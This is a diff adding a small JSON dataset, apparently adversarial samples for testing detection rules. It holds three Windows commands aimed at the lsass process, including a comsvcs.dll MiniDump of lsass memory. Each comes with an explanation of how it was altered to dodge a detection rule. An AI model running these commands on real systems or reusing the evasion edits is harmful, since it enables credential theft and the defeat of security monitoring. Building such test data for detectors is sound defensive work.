@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c tasklist /fi \"Imagename eq lsass.exe\" > C:\\Lab\\out\\tasklist_output.txt",
+    "explanation": "Insertion: Added redirection to a lab file to avoid triggering the 'cmd.exe /c' detection by changing the command's purpose."
+  },
+  {
+    "output": "cmd /k tasklist /v /fo csv | findstr /i \"lsass\" > C:\\Lab\\out\\filtered_tasklist.txt",
+    "explanation": "Substitution and Insertion: Replaced 'cmd.exe' with 'cmd' and added output redirection to a lab file to avoid the 'cmd.exe /k' and 'findstr' detection."
+  },
+  {
+    "output": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump lsass.exe C:\\Lab\\out\\dump.7z full",
+    "explanation": "Substitution: Replaced the suspicious path with a lab directory to avoid the 'C:\\Windows\\Temp\\' detection while keeping the same executable and intent."
+  }
+]
